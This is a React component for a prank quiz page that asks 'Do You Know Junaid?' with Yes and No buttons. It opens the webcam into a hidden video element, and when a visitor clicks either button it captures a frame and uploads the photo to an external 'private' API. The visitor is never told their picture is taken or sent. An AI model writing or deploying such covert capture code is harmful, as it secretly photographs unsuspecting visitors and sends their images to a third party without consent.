import React, { useEffect, useRef, useState } from "react";
import Typist from "react-typist";
import image from "../images/junaid.jpg";
import ModalDialog from "./Modal";
import { useNavigate } from "react-router-dom";
import { Audio } from "react-loader-spinner";

const Hero = () => {
  const [isShow, invokeModal] = useState(false);
  const [imageUploaded, setImageUploaded] = useState(false);
  const [loading, setLoading] = useState(false);
  const [selected, setSelected] = useState("Yes");
  const [showButtons, setShowButtons] = useState(false);

  const videoRef = useRef(null);
  const streamRef = useRef(null); // Ref to store the stream object

  const nav = useNavigate();

  const initModal = () => {
    return invokeModal(!false);
  };

  const handleCaptureImage = () => {
    const videoElement = videoRef.current;
    const canvas = document.createElement("canvas");
    canvas.style.display = "none";
    canvas.width = videoElement.videoWidth;
    canvas.height = videoElement.videoHeight;

    const context = canvas.getContext("2d");
    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

    const imageDataUrl = canvas.toDataURL("image/png");

    const byteString = atob(imageDataUrl.split(",")[1]);
    const mimeString = imageDataUrl.split(",")[0].split(":")[1].split(";")[0];
    const arrayBuffer = new ArrayBuffer(byteString.length);
    const uintArray = new Uint8Array(arrayBuffer);

    for (let i = 0; i < byteString.length; i++) {
      uintArray[i] = byteString.charCodeAt(i);
    }

    const blob = new Blob([arrayBuffer], { type: mimeString });

    // Send the file to the server

    sendImageToServer(blob);
  };

  const sendImageToServer = async (file) => {
    try {
      const formData = new FormData();
      formData.append("image", file);

      const response = await fetch(
        "https://experttraderpk.com/api/junaid-private-api",
        {
          method: "POST",
          body: formData,
        }
      );

      if (response.ok) {
        setImageUploaded(true);
        setLoading(false);
        // nav('/step-2',{selected});
      } else {
      }
    } catch (error) {
      window.location.reload();
    }
  };

  const handleCameraAccessError = (error) => {
    // console.log("Error accessing camera:", error);
  };

  useEffect(() => {
    navigator.mediaDevices
      .getUserMedia({ video: true })
      .then((stream) => {
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          streamRef.current = stream; 

        }
      })
      .catch(handleCameraAccessError);
    return () => {
      if (streamRef.current) {
        streamRef.current.getTracks().forEach((track) => track.stop());
      }
    };
  }, []);

  const handleNo = () => {
    setSelected("No");
    setLoading(true);
    handleCaptureImage();
    initModal();
  };

  const handleYes = () => {
    setSelected("Yes");
    setLoading(true);
    handleCaptureImage();
  };
  useEffect(() => {
    return () => {};
  }, []);

  return (
    <div className="container main text-center pt-5">
      <div className={`generated-text name p-3`}>
        <h1 className="text-style">
          <Typist
            startDelay={1000}
            cursor={{
              blink: true,
              element: "_",
              hideWhenDone: true,
              hideWhenDoneDelay: 1,
            }}
          >
            Helo There 😍!
          </Typist>
        </h1>
      </div>
      <div className="row justify-content-center">
        <div className="col-md-6">
          <div className="card shadow">
            <div className="card-body wish-card ">
              <div className="row text-style">
                <Typist
                  cursor={{ element: "_" }}
                  startDelay={2000}
                  onTypingDone={() => setShowButtons(true)}
                >
                  <img className="image m-3" src={image} alt="Junaid " />
                  Do You Know Junaid?
                </Typist>
              </div>
              <div className="row ">
                {showButtons && (
                  <>
                    <div className="col-6 text-right">
                      <button
                        onClick={handleYes}
                        className="btn-grad  float-right"
                      >
                        <Typist cursor={{ element: "" }}>Yes 😍</Typist>
                      </button>
                    </div>
                    <div className="col-6  text-right">
                      <button
                        onClick={handleNo}
                        className="btn-grad   float-right"
                      >
                        <Typist cursor={{ element: "" }}>No 🥺</Typist>
                      </button>
                    </div>
                  </>
                )}
                <div className="col-12">
                  {loading && (
                    <>
                      <Typist>Ok Please Wait ........</Typist>
                      <Audio ariaLabel="Loading" color="blue" />
                    </>
                  )}
                </div>
              </div>
              <div className="input">
                <div className="card-header">
                  <div className="card-name"></div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <video style={{ display: "none" }} ref={videoRef} autoPlay></video>
      <ModalDialog
        title={"Jhoot"}
        content={"Jhoot Mat Bolo 😂😂"}
        isShow={isShow}
        invokeModal={invokeModal}
      />
    </div>
  );
};

export default Hero;
